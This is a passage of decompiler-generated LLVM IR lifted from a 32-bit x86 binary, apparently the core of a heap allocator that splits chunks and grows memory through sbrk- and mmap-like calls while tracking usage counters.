  %v1_804dd9d = or i32 %v0_804dd97, 1
  store i32 %v1_804dd9d, i32* %eax.global-to-local, align 4
  %v1_804dda0 = load i32, i32* @ecx, align 4
  %v2_804dda0 = add i32 %v1_804dda0, 4
  %v3_804dda0 = inttoptr i32 %v2_804dda0 to i32*
  store i32 %v4_804dd92, i32* %v3_804dda0, align 4
  %v0_804dda3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dda3 = load i32, i32* @edx, align 4
  %v3_804dda3 = add i32 %v1_804dda3, %v0_804dda3
  %v4_804dda3 = inttoptr i32 %v3_804dda3 to i32*
  store i32 %v0_804dda3, i32* %v4_804dda3, align 4
  %v0_804dda6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dda6 = load i32, i32* @edx, align 4
  %v2_804dda6 = add i32 %v1_804dda6, 4
  %v3_804dda6 = inttoptr i32 %v2_804dda6 to i32*
  store i32 %v0_804dda6, i32* %v3_804dda6, align 4
  br label %dec_label_pc_804dda9

dec_label_pc_804dda9:                             ; preds = %dec_label_pc_804dd63, %dec_label_pc_804dd92
  %v0_804dda9 = load i32, i32* @ecx, align 4
  %v1_804dda9 = add i32 %v0_804dda9, 8
  store i32 %v1_804dda9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804ddb1.loopexit:                    ; preds = %dec_label_pc_804dcfe
  br label %dec_label_pc_804ddb1

dec_label_pc_804ddb1:                             ; preds = %dec_label_pc_804ddb1.loopexit, %dec_label_pc_804dab9, %dec_label_pc_804dac1
  %v0_804ddb1 = load i32, i32* @global_var_8058a0c.142, align 4
  store i32 %v0_804ddb1, i32* @ebx, align 4
  %v1_804ddbb = add i32 %v1_804de46, 16
  store i32 %v1_804ddbb, i32* @esi, align 4
  %v1_804ddbe = add i32 %v0_804ddb1, 4
  %v2_804ddbe = inttoptr i32 %v1_804ddbe to i32*
  %v3_804ddbe = load i32, i32* %v2_804ddbe, align 4
  %v1_804ddc5 = and i32 %v3_804ddbe, -4
  store i32 %v1_804ddc5, i32* %ecx.global-to-local, align 4
  %v7_804ddc8 = icmp ult i32 %v1_804ddc5, %v1_804ddbb
  br i1 %v7_804ddc8, label %dec_label_pc_804dde8, label %dec_label_pc_804ddcc

dec_label_pc_804ddcc:                             ; preds = %dec_label_pc_804ddb1
  %v2_804ddd0 = add i32 %v0_804ddb1, %v1_804de46
  store i32 %v2_804ddd0, i32* @edx, align 4
  %v1_804ddd3 = or i32 %v1_804de46, 1
  store i32 %v1_804ddd3, i32* %eax.global-to-local, align 4
  store i32 %v2_804ddd0, i32* @global_var_8058a0c.142, align 4
  store i32 %v1_804ddd3, i32* %v2_804ddbe, align 4
  %v0_804dddf = load i32, i32* %ecx.global-to-local, align 4
  %v5_804dddf = sub i32 %v0_804dddf, %v1_804de46
  store i32 %v5_804dddf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e13b

dec_label_pc_804dde8:                             ; preds = %dec_label_pc_804ddb1
  %v0_804dde8 = load i32, i32* @global_var_8058d3c.147, align 4
  store i32 %v0_804dde8, i32* %edx.global-to-local, align 4
  %v0_804ddee = load i8, i8* @global_var_80589e0.141, align 32
  %v1_804ddee = and i8 %v0_804ddee, 2
  %v2_804ddee = icmp eq i8 %v1_804ddee, 0
  br i1 %v2_804ddee, label %dec_label_pc_804de1c, label %dec_label_pc_804ddf7

dec_label_pc_804ddf7:                             ; preds = %dec_label_pc_804dde8
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804ddff = call i32 @function_804e57d(i32* bitcast (i8* @global_var_80589e0.141 to i32*))
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* @ebx, align 4
  %v1_804de09 = add i32 %v1_804de46, -7
  store i32 %v1_804de09, i32* %eax.global-to-local, align 4
  store i32 %v1_804de09, i32* %stack_var_-92, align 4
  %v1_804de0d = call i32 @function_804da52(i32 %v1_804de09)
  store i32 %v1_804de0d, i32* %eax.global-to-local, align 4
  store i32 %v1_804de0d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804de1c:                             ; preds = %dec_label_pc_804dde8
  %v1_804de1c = add i32 %v0_804dde8, -1
  store i32 %v1_804de1c, i32* @ecx, align 4
  store i32 %v1_804de46, i32* @ebx, align 4
  %v1_804de27 = load i32, i32* @global_var_8058d2c.148, align 4
  %v7_804de27 = icmp ult i32 %v1_804de46, %v1_804de27
  br i1 %v7_804de27, label %dec_label_pc_804dee9, label %dec_label_pc_804de33

dec_label_pc_804de33:                             ; preds = %dec_label_pc_804de1c
  %v0_804de33 = load i32, i32* @global_var_8058d30.149, align 16
  store i32 %v0_804de33, i32* %eax.global-to-local, align 4
  %v1_804de38 = load i32, i32* @global_var_8058d34.150, align 4
  %v5_804de3e = icmp slt i32 %v0_804de33, %v1_804de38
  br i1 %v5_804de3e, label %dec_label_pc_804de44, label %dec_label_pc_804dee9

dec_label_pc_804de44:                             ; preds = %dec_label_pc_804de33
  %v2_804de46 = add i32 %v1_804de46, 10
  %v3_804de46 = add i32 %v2_804de46, %v0_804dde8
  %v1_804de4a = sub i32 0, %v0_804dde8
  store i32 %v1_804de4a, i32* %eax.global-to-local, align 4
  %v2_804de4c = and i32 %v3_804de46, %v1_804de4a
  store i32 %v2_804de4c, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804de4c, %v1_804de46
  br i1 %tmp129, label %dec_label_pc_804de58, label %dec_label_pc_804dee9

dec_label_pc_804de58:                             ; preds = %dec_label_pc_804de44
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804de65 = call i32 @function_804f5dc(i32 0, i32 %v2_804de4c, i32 3, i32 34, i32 0, i32 0, i32 %v1_804de1c, i32 %v1_804de1c)
  store i32 %v8_804de65, i32* %eax.global-to-local, align 4
  store i32 %v8_804de65, i32* @edx, align 4
  %v10_804de6f = icmp eq i32 %v8_804de65, -1
  br i1 %v10_804de6f, label %dec_label_pc_804de58.dec_label_pc_804dee9_crit_edge, label %dec_label_pc_804de74

dec_label_pc_804de58.dec_label_pc_804dee9_crit_edge: ; preds = %dec_label_pc_804de58
  %v0_804dee9.pre = load i32, i32* @global_var_8058a0c.142, align 4
  br label %dec_label_pc_804dee9

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de58
  %v1_804de76 = urem i32 %v8_804de65, 8
  %v2_804de76 = icmp eq i32 %v1_804de76, 0
  store i32 %v1_804de76, i32* @ecx, align 4
  br i1 %v2_804de76, label %dec_label_pc_804de8e, label %dec_label_pc_804de7b

dec_label_pc_804de7b:                             ; preds = %dec_label_pc_804de74
  %v0_804de80 = load i32, i32* @ebx, align 4
  %v2_804de82 = sub nsw i32 8, %v1_804de76
  store i32 %v2_804de82, i32* %eax.global-to-local, align 4
  %v2_804de84 = add i32 %v2_804de82, %v8_804de65
  store i32 %v2_804de84, i32* @edx, align 4
  %v2_804de86 = sub i32 %v0_804de80, %v2_804de82
  store i32 %v2_804de86, i32* %esi.global-to-local, align 4
  %v2_804de88 = inttoptr i32 %v2_804de84 to i32*
  store i32 %v2_804de82, i32* %v2_804de88, align 4
  br label %dec_label_pc_804de96

dec_label_pc_804de8e:                             ; preds = %dec_label_pc_804de74
  %v1_804de8e = inttoptr i32 %v8_804de65 to i32*
  store i32 0, i32* %v1_804de8e, align 4
  br label %dec_label_pc_804de96

dec_label_pc_804de96:                             ; preds = %dec_label_pc_804de7b, %dec_label_pc_804de8e
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804de7b ], [ @ebx, %dec_label_pc_804de8e ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804de96 = or i32 %storemerge, 2
  %v1_804de99 = load i32, i32* @edx, align 4
  %v2_804de99 = add i32 %v1_804de99, 4
  %v3_804de99 = inttoptr i32 %v2_804de99 to i32*
  store i32 %v1_804de96, i32* %v3_804de99, align 4
  %v0_804de9c = load i32, i32* @global_var_8058d30.149, align 16
  %v1_804dea1 = add i32 %v0_804de9c, 1
  store i32 %v1_804dea1, i32* %eax.global-to-local, align 4
  store i32 %v1_804dea1, i32* @global_var_8058d30.149, align 16
  %v1_804dea7 = load i32, i32* @global_var_8058d38.151, align 8
  %v7_804dead = icmp sgt i32 %v1_804dea1, %v1_804dea7
  br i1 %v7_804dead, label %dec_label_pc_804deaf, label %dec_label_pc_804deb4

dec_label_pc_804deaf:                             ; preds = %dec_label_pc_804de96
  store i32 %v1_804dea1, i32* @global_var_8058d38.151, align 8
  br label %dec_label_pc_804deb4

dec_label_pc_804deb4:                             ; preds = %dec_label_pc_804de96, %dec_label_pc_804deaf
  %v0_804deb4 = load i32, i32* @global_var_8058d44.152, align 4
  %v1_804deb9 = load i32, i32* @ebx, align 4
  %v2_804deb9 = add i32 %v1_804deb9, %v0_804deb4
  store i32 %v2_804deb9, i32* %eax.global-to-local, align 4
  store i32 %v2_804deb9, i32* @global_var_8058d44.152, align 4
  %v1_804dec0 = load i32, i32* @global_var_8058d50.153, align 16
  %tmp130 = icmp ugt i32 %v2_804deb9, %v1_804dec0
  br i1 %tmp130, label %dec_label_pc_804dec8, label %dec_label_pc_804decd

dec_label_pc_804dec8:                             ; preds = %dec_label_pc_804deb4
  store i32 %v2_804deb9, i32* @global_var_8058d50.153, align 16
  br label %dec_label_pc_804decd

dec_label_pc_804decd:                             ; preds = %dec_label_pc_804deb4, %dec_label_pc_804dec8
  %v1_804decd = load i32, i32* @global_var_8058d48.154, align 8
  %v2_804decd = add i32 %v1_804decd, %v2_804deb9
  store i32 %v2_804decd, i32* %eax.global-to-local, align 4
  %v1_804ded3 = load i32, i32* @global_var_8058d54.155, align 4
  %tmp131 = icmp ugt i32 %v2_804decd, %v1_804ded3
  br i1 %tmp131, label %dec_label_pc_804dedf, label %dec_label_pc_804db30

dec_label_pc_804dedf:                             ; preds = %dec_label_pc_804decd
  store i32 %v2_804decd, i32* @global_var_8058d54.155, align 4
  br label %dec_label_pc_804db30

dec_label_pc_804dee9:                             ; preds = %dec_label_pc_804de44, %dec_label_pc_804de58.dec_label_pc_804dee9_crit_edge, %dec_label_pc_804de33, %dec_label_pc_804de1c
  %v0_804dee9 = phi i32 [ %v0_804dee9.pre, %dec_label_pc_804de58.dec_label_pc_804dee9_crit_edge ], [ %v0_804ddb1, %dec_label_pc_804de33 ], [ %v0_804ddb1, %dec_label_pc_804de44 ], [ %v0_804ddb1, %dec_label_pc_804de1c ]
  store i32 %v0_804dee9, i32* %eax.global-to-local, align 4
  %v1_804def2 = add i32 %v0_804dee9, 4
  %v2_804def2 = inttoptr i32 %v1_804def2 to i32*
  %v3_804def2 = load i32, i32* %v2_804def2, align 4
  %v1_804defc = and i32 %v3_804def2, -4
  %v2_804defc = icmp eq i32 %v1_804defc, 0
  store i32 %v1_804defc, i32* @ebp, align 4
  %v1_804deff = load i32, i32* @global_var_8058d28.156, align 8
  %v2_804deff = add i32 %v1_804deff, %v1_804ddbb
  store i32 %v2_804deff, i32* %eax.global-to-local, align 4
  %v0_804df05 = load i8, i8* @global_var_8058d40.157, align 64
  %v1_804df05 = urem i8 %v0_804df05, 2
  %v2_804df05 = icmp eq i8 %v1_804df05, 0
  br i1 %v2_804df05, label %dec_label_pc_804df10, label %dec_label_pc_804df0e

dec_label_pc_804df0e:                             ; preds = %dec_label_pc_804dee9
  %v2_804df0e = sub i32 %v2_804deff, %v1_804defc
  store i32 %v2_804df0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df10

dec_label_pc_804df10:                             ; preds = %dec_label_pc_804dee9, %dec_label_pc_804df0e
  %v0_804df14 = phi i32 [ %v2_804deff, %dec_label_pc_804dee9 ], [ %v2_804df0e, %dec_label_pc_804df0e ]
  %v5_804df14 = add i32 %v0_804df14, %v1_804de1c
  store i32 %v5_804df14, i32* %eax.global-to-local, align 4
  %v1_804df18 = sub i32 0, %v0_804dde8
  store i32 %v1_804df18, i32* @edx, align 4
  %v2_804df20 = and i32 %v5_804df14, %v1_804df18
  store i32 %v2_804df20, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804df20, 1
  br i1 %tmp88, label %dec_label_pc_804df3a, label %dec_label_pc_804df24

dec_label_pc_804df24:                             ; preds = %dec_label_pc_804df10
  store i32 %v2_804df20, i32* %stack_var_-92, align 4
  %v1_804df28 = call i32 @function_804fa00(i32 %v2_804df20)
  store i32 %v1_804df28, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_804df28, i32* @ebx, align 4
  %v10_804df35 = icmp eq i32 %v1_804df28, -1
  %v1_804df38 = icmp eq i1 %v10_804df35, false
  br i1 %v1_804df38, label %dec_label_pc_804df90.dec_label_pc_804df99_crit_edge, label %dec_label_pc_804df24.dec_label_pc_804df3a_crit_edge

dec_label_pc_804df24.dec_label_pc_804df3a_crit_edge: ; preds = %dec_label_pc_804df24
  %v0_804df3a.pre = load i8, i8* @global_var_8058d40.157, align 64
  br label %dec_label_pc_804df3a

dec_label_pc_804df3a:                             ; preds = %dec_label_pc_804df24.dec_label_pc_804df3a_crit_edge, %dec_label_pc_804df10
  %v0_804df66 = phi i32 [ -1, %dec_label_pc_804df24.dec_label_pc_804df3a_crit_edge ], [ %v1_804df18, %dec_label_pc_804df10 ]
  %v0_804df3a = phi i8 [ %v0_804df3a.pre, %dec_label_pc_804df24.dec_label_pc_804df3a_crit_edge ], [ %v0_804df05, %dec_label_pc_804df10 ]
  %v1_804df3a = urem i8 %v0_804df3a, 2
  %v2_804df3a = icmp eq i8 %v1_804df3a, 0
  br i1 %v2_804df3a, label %dec_label_pc_804df3a.dec_label_pc_804df4f_crit_edge, label %dec_label_pc_804df43

dec_label_pc_804df3a.dec_label_pc_804df4f_crit_edge: ; preds = %dec_label_pc_804df3a
  %v0_804df4f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804df43:                             ; preds = %dec_label_pc_804df3a
  %v2_804df47 = add i32 %v1_804defc, %v1_804de1c
  store i32 %v2_804df47, i32* %eax.global-to-local, align 4
  %v0_804df49 = load i32, i32* @esi, align 4
  %v2_804df49 = add i32 %v0_804df49, %v2_804df47
  %v5_804df4b = and i32 %v2_804df49, %v1_804df18
  store i32 %v5_804df4b, i32* @esi, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804df4f:                             ; preds = %dec_label_pc_804df3a.dec_label_pc_804df4f_crit_edge, %dec_label_pc_804df43
  %v0_804df4f = phi i32 [ %v0_804df4f.pre, %dec_label_pc_804df3a.dec_label_pc_804df4f_crit_edge ], [ %v5_804df4b, %dec_label_pc_804df43 ]
  %tmp132 = icmp ult i32 %v0_804df4f, 1048576
  br i1 %tmp132, label %dec_label_pc_804df57, label %dec_label_pc_804df5c

dec_label_pc_804df57:                             ; preds = %dec_label_pc_804df4f
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804df5c

dec_label_pc_804df5c:                             ; preds = %dec_label_pc_804df4f, %dec_label_pc_804df57
  %v0_804df70 = phi i32 [ %v0_804df4f, %dec_label_pc_804df4f ], [ 1048576, %dec_label_pc_804df57 ]
  %tmp133 = icmp ugt i32 %v0_804df70, %v1_804de46
  br i1 %tmp133, label %dec_label_pc_804df66, label %dec_label_pc_804e19e

dec_label_pc_804df66:                             ; preds = %dec_label_pc_804df5c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804df73 = call i32 @function_804f5dc(i32 0, i32 %v0_804df70, i32 3, i32 34, i32 0, i32 0, i32 %v0_804df66, i32 %v0_804df66)
  store i32 %v8_804df73, i32* %eax.global-to-local, align 4
  store i32 %v8_804df73, i32* @ebx, align 4
  %v10_804df7d = icmp eq i32 %v8_804df73, -1
  br i1 %v10_804df7d, label %dec_label_pc_804e19e, label %dec_label_pc_804df90.thread

dec_label_pc_804df90.thread:                      ; preds = %dec_label_pc_804df66
  %v0_804df86 = load i8, i8* @global_var_8058d40.157, align 1
  %v2_804df86 = and i8 %v0_804df86, -2
  store i8 %v2_804df86, i8* @global_var_8058d40.157, align 64
  %v1_804df8d = load i32, i32* @esi, align 4
  %v2_804df8d = add i32 %v1_804df8d, %v8_804df73
  store i32 %v2_804df8d, i32* @edx, align 4
  br label %dec_label_pc_804df99

dec_label_pc_804df90.dec_label_pc_804df99_crit_edge: ; preds = %dec_label_pc_804df24
  %v1_804df9d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804df99

dec_label_pc_804df99:                             ; preds = %dec_label_pc_804df90.dec_label_pc_804df99_crit_edge, %dec_label_pc_804df90.thread
  %v1_804df9d = phi i32 [ %v1_804df8d, %dec_label_pc_804df90.thread ], [ %v1_804df9d.pre, %dec_label_pc_804df90.dec_label_pc_804df99_crit_edge ]
  %v0_804e06592 = phi i32 [ %v8_804df73, %dec_label_pc_804df90.thread ], [ %v1_804df28, %dec_label_pc_804df90.dec_label_pc_804df99_crit_edge ]
  %v0_804e05791 = phi i32 [ %v2_804df8d, %dec_label_pc_804df90.thread ], [ -1, %dec_label_pc_804df90.dec_label_pc_804df99_crit_edge ]
  %v0_804df9d = load i32, i32* @global_var_8058d48.154, align 8
  %v2_804df9d = add i32 %v1_804df9d, %v0_804df9d
  store i32 %v2_804df9d, i32* @global_var_8058d48.154, align 8
  %v2_804dfa3 = add i32 %v1_804defc, %v0_804dee9
  store i32 %v2_804dfa3, i32* %ecx.global-to-local, align 4
  %v2_804dfa5 = sub i32 %v0_804e06592, %v2_804dfa3
  %v7_804dfa5 = icmp ult i32 %v0_804e06592, %v2_804dfa3
  %v12_804dfa5 = icmp eq i32 %v2_804dfa5, 0
  %v1_804dfa7 = icmp eq i1 %v12_804dfa5, false
  br i1 %v1_804dfa7, label %dec_label_pc_804dfc0, label %dec_label_pc_804dfa9

dec_label_pc_804dfa9:                             ; preds = %dec_label_pc_804df99
  %v10_804dfa9 = icmp eq i32 %v0_804e05791, -1
  %v1_804dfac = icmp eq i1 %v10_804dfa9, false
  br i1 %v1_804dfac, label %dec_label_pc_804dfc0, label %dec_label_pc_804dfae

dec_label_pc_804dfae:                             ; preds = %dec_label_pc_804dfa9
  %v2_804dfae = add i32 %v1_804df9d, %v1_804defc
  store i32 %v0_804dee9, i32* %ecx.global-to-local, align 4
  %v1_804dfb5 = or i32 %v2_804dfae, 1
  store i32 %v1_804dfb5, i32* %eax.global-to-local, align 4
  store i32 %v1_804dfb5, i32* %v2_804def2, align 4
  br label %dec_label_pc_804e0ed

dec_label_pc_804dfc0:                             ; preds = %dec_label_pc_804dfa9, %dec_label_pc_804df99
  %v0_804dfc0 = load i8, i8* @global_var_8058d40.157, align 1
  %v1_804dfc0 = sext i8 %v0_804dfc0 to i32
  store i32 %v1_804dfc0, i32* %eax.global-to-local, align 4
  %v2_804dfc5 = urem i8 %v0_804dfc0, 2
  %v3_804dfc5 = icmp eq i8 %v2_804dfc5, 0
  br i1 %v3_804dfc5, label %dec_label_pc_804dfd9, label %dec_label_pc_804dfc9

dec_label_pc_804dfc9:                             ; preds = %dec_label_pc_804dfc0
  br i1 %v2_804defc, label %dec_label_pc_804dfd9, label %dec_label_pc_804dfcd

dec_label_pc_804dfcd:                             ; preds = %dec_label_pc_804dfc9
  %v1_804dfcf = icmp eq i1 %v7_804dfa5, false
  br i1 %v1_804dfcf, label %dec_label_pc_804dfd9, label %dec_label_pc_804dfd1

dec_label_pc_804dfd1:                             ; preds = %dec_label_pc_804dfcd
  %v1_804dfd1 = and i32 %v1_804dfc0, -2
  %v4_804dfd1 = trunc i32 %v1_804dfd1 to i8
  store i32 %v1_804dfd1, i32* %eax.global-to-local, align 4
  store i8 %v4_804dfd1, i8* @global_var_8058d40.157, align 64
  br label %dec_label_pc_804dfd9

dec_label_pc_804dfd9:                             ; preds = %dec_label_pc_804dfcd, %dec_label_pc_804dfc9, %dec_label_pc_804dfc0, %dec_label_pc_804dfd1
  %v0_804dfd9 = phi i8 [ %v0_804dfc0, %dec_label_pc_804dfcd ], [ %v0_804dfc0, %dec_label_pc_804dfc9 ], [ %v0_804dfc0, %dec_label_pc_804dfc0 ], [ %v4_804dfd1, %dec_label_pc_804dfd1 ]
  %v1_804dfd9 = urem i8 %v0_804dfd9, 2
  %v2_804dfd9 = icmp eq i8 %v1_804dfd9, 0
  br i1 %v2_804dfd9, label %dec_label_pc_804e057, label %dec_label_pc_804dfe2

dec_label_pc_804dfe2:                             ; preds = %dec_label_pc_804dfd9
  br i1 %v2_804defc, label %dec_label_pc_804dff0, label %dec_label_pc_804dfe6

dec_label_pc_804dfe6:                             ; preds = %dec_label_pc_804dfe2
  store i32 %v2_804dfa5, i32* %eax.global-to-local, align 4
  %v2_804dfea = add i32 %v2_804df9d, %v2_804dfa5
  store i32 %v2_804dfea, i32* @global_var_8058d48.154, align 8
  br label %dec_label_pc_804dff0

dec_label_pc_804dff0:                             ; preds = %dec_label_pc_804dfe2, %dec_label_pc_804dfe6
  %v1_804dff2 = urem i32 %v0_804e06592, 8
  %v2_804dff2 = icmp eq i32 %v1_804dff2, 0
  store i32 %v1_804dff2, i32* %edx.global-to-local, align 4
  %v1_804dff5 = icmp eq i1 %v2_804dff2, false
  br i1 %v1_804dff5, label %dec_label_pc_804dffd, label %dec_label_pc_804dff7

dec_label_pc_804dff7:                             ; preds = %dec_label_pc_804dff0
  store i32 %v0_804e06592, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e007

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dff0
  %v2_804e002 = sub nsw i32 8, %v1_804dff2
  store i32 %v2_804e002, i32* %eax.global-to-local, align 4
  %v2_804e004 = add i32 %v2_804e002, %v0_804e06592
  store i32 %v2_804e004, i32* @edi, align 4
  br label %dec_label_pc_804e007

dec_label_pc_804e007:                             ; preds = %dec_label_pc_804dff7, %dec_label_pc_804dffd
  %v0_804e00a = phi i32 [ 0, %dec_label_pc_804dff7 ], [ %v2_804e002, %dec_label_pc_804dffd ]
  %v2_804e007 = add i32 %v1_804df9d, %v0_804e06592
  %v2_804e00a = add i32 %v0_804e00a, %v1_804defc
  store i32 %v2_804e00a, i32* %ecx.global-to-local, align 4
  %v2_804e013 = add i32 %v2_804e00a, %v2_804e007
  store i32 %v2_804e013, i32* %edx.global-to-local, align 4
  %v2_804e019 = add i32 %v2_804e013, %v1_804de1c
  %v5_804e01c = and i32 %v2_804e019, %v1_804df18
  %v2_804e023 = sub i32 %v5_804e01c, %v2_804e013
  store i32 %v2_804e023, i32* %eax.global-to-local, align 4
  %v2_804e025 = add i32 %v2_804e023, %v2_804e00a
  store i32 %v2_804e025, i32* @esi, align 4
  store i32 %v2_804e025, i32* %stack_var_-92, align 4
  %v1_804e029 = call i32 @function_804fa00(i32 %v2_804e025)
  store i32 %v1_804e029, i32* %eax.global-to-local, align 4
  store i32 %v1_804e029, i32* @edx, align 4
  %v10_804e033 = icmp eq i32 %v1_804e029, -1
  %v1_804e036 = icmp eq i1 %v10_804e033, false
  br i1 %v1_804e036, label %dec_label_pc_804e046, label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e007
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e03d = call i32 @function_804fa00(i32 0)
  store i32 %v1_804e03d, i32* %eax.global-to-local, align 4
  store i32 %v1_804e03d, i32* @edx, align 4
  br label %dec_label_pc_804e07a

dec_label_pc_804e046:                             ; preds = %dec_label_pc_804e007
  %v1_804e046 = load i32, i32* @ebx, align 4
  %v7_804e046 = icmp ult i32 %v1_804e029, %v1_804e046
  %v1_804e048 = icmp eq i1 %v7_804e046, false
  br i1 %v1_804e048, label %dec_label_pc_804e07f, label %dec_label_pc_804e04a

dec_label_pc_804e04a:                             ; preds = %dec_label_pc_804e046
  %v0_804e04a = load i8, i8* @global_var_8058d40.157, align 1
  %v2_804e04a = and i8 %v0_804e04a, -2
  store i8 %v2_804e04a, i8* @global_var_8058d40.157, align 64
  store i32 %v2_804e007, i32* @edx, align 4
  br label %dec_label_pc_804e05e

dec_label_pc_804e057:                             ; preds = %dec_label_pc_804dfd9
  %v10_804e057 = icmp eq i32 %v0_804e05791, -1
  br i1 %v10_804e057, label %dec_label_pc_804e062, label %dec_label_pc_804e05c

dec_label_pc_804e05c:                             ; preds = %dec_label_pc_804e057
  store i32 %v0_804e06592, i32* @edi, align 4
  br label %dec_label_pc_804e05e

dec_label_pc_804e05e:                             ; preds = %dec_label_pc_804e04a, %dec_label_pc_804e05c
  %v0_804e07f49 = phi i32 [ %v2_804e007, %dec_label_pc_804e04a ], [ %v0_804e05791, %dec_label_pc_804e05c ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e07f

dec_label_pc_804e062:                             ; preds = %dec_label_pc_804e057
  store i32 %v0_804e06592, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e069 = call i32 @function_804fa00(i32 0)
  store i32 %v1_804e069, i32* @edx, align 4
  %v1_804e070 = load i32, i32* @ebx, align 4
  %v2_804e070 = sub i32 %v1_804e069, %v1_804e070
  %v1_804e072 = load i32, i32* @esi, align 4
  %v2_804e072 = sub i32 %v2_804e070, %v1_804e072
  store i32 %v2_804e072, i32* %eax.global-to-local, align 4
  %v0_804e074 = load i32, i32* @global_var_8058d48.154, align 8
  %v2_804e074 = add i32 %v0_804e074, %v2_804e072
  store i32 %v2_804e074, i32* @global_var_8058d48.154, align 8
  br label %dec_label_pc_804e07a

dec_label_pc_804e07a:                             ; preds = %dec_label_pc_804e038, %dec_label_pc_804e062
  %v0_804e07f48 = phi i32 [ %v1_804e03d, %dec_label_pc_804e038 ], [ %v1_804e069, %dec_label_pc_804e062 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e07f

dec_label_pc_804e07f:                             ; preds = %dec_label_pc_804e046, %dec_label_pc_804e05e, %dec_label_pc_804e07a
  %v0_804e084 = phi i32 [ %v1_804e029, %dec_label_pc_804e046 ], [ %v0_804e07f49, %dec_label_pc_804e05e ], [ %v0_804e07f48, %dec_label_pc_804e07a ]
  %v10_804e07f = icmp eq i32 %v0_804e084, -1
  br i1 %v10_804e07f, label %dec_label_pc_804e0ed, label %dec_label_pc_804e084

dec_label_pc_804e084:                             ; preds = %dec_label_pc_804e07f
  %v1_804e084 = load i32, i32* @edi, align 4
  %v2_804e084 = sub i32 %v0_804e084, %v1_804e084
  store i32 %v2_804e084, i32* @edx, align 4
  store i32 %v1_804e084, i32* @global_var_8058a0c.142, align 4
  %v1_804e08c = load i32, i32* @esi, align 4
  %v2_804e08c = add i32 %v1_804e08c, %v2_804e084
  %v1_804e08f = or i32 %v2_804e08c, 1
  store i32 %v1_804e08f, i32* %eax.global-to-local, align 4
  %v2_804e092 = add i32 %v1_804e084, 4
  %v3_804e092 = inttoptr i32 %v2_804e092 to i32*
  store i32 %v1_804e08f, i32* %v3_804e092, align 4
  %v0_804e095 = load i32, i32* @global_var_8058d48.154, align 8
  %v1_804e095 = load i32, i32* @esi, align 4
  %v2_804e095 = add i32 %v1_804e095, %v0_804e095
  store i32 %v2_804e095, i32* @global_var_8058d48.154, align 8
  br i1 %v2_804defc, label %dec_label_pc_804e0ed, label %dec_label_pc_804e09f

dec_label_pc_804e09f:                             ; preds = %dec_label_pc_804e084
  %v1_804e09f = add i32 %v1_804defc, -12
  store i32 %v0_804dee9, i32* %ecx.global-to-local, align 4
  %v1_804e0a6 = and i32 %v1_804e09f, -8
  store i32 %v1_804e0a6, i32* %eax.global-to-local, align 4
  %v1_804e0ab = or i32 %v1_804e0a6, 1
  store i32 %v1_804e0ab, i32* @edx, align 4
  %v5_804e0ae = icmp ult i32 %v1_804e0a6, 15
  store i32 %v1_804e0ab, i32* %v2_804def2, align 4
  %v0_804e0b4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e0b4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0b4 = add i32 %v0_804e0b4, 4
  %v3_804e0b4 = add i32 %v2_804e0b4, %v1_804e0b4
  %v4_804e0b4 = inttoptr i32 %v3_804e0b4 to i32*
  store i32 5, i32* %v4_804e0b4, align 4
  %v0_804e0bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e0bc = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0bc = add i32 %v0_804e0bc, 8
  %v3_804e0bc = add i32 %v2_804e0bc, %v1_804e0bc
  %v4_804e0bc = inttoptr i32 %v3_804e0bc to i32*
  store i32 5, i32* %v4_804e0bc, align 4
  br i1 %v5_804e0ae, label %dec_label_pc_804e0ed, label %dec_label_pc_804e0c6

dec_label_pc_804e0c6:                             ; preds = %dec_label_pc_804e09f
  %v0_804e0c9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e0cb = add i32 %v0_804e0c9, 8
  store i32 %v1_804e0cb, i32* %eax.global-to-local, align 4
  %v0_804e0ce = load i32, i32* @global_var_8058d24.158, align 4
  store i32 %v0_804e0ce, i32* @ebx, align 4
  store i32 %v1_804e0cb, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8058d24.158, align 4
  %v1_804e0df = call i32 @function_804e725(i32 %v1_804e0cb)
  store i32 %v1_804e0df, i32* %eax.global-to-local, align 4
  %v0_804e0e4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e0e4, i32* @global_var_8058d24.158, align 4
  br label %dec_label_pc_804e0ed

dec_label_pc_804e0ed:                             ; preds = %dec_label_pc_804e09f, %dec_label_pc_804e084, %dec_label_pc_804e07f, %dec_label_pc_804dfae, %dec_label_pc_804e0c6
  %v0_804e0ed = load i32, i32* @global_var_8058d48.154, align 8
  store i32 %v0_804e0ed, i32* %eax.global-to-local, align 4
  %v1_804e0f2 = load i32, i32* @global_var_8058d4c.159, align 4
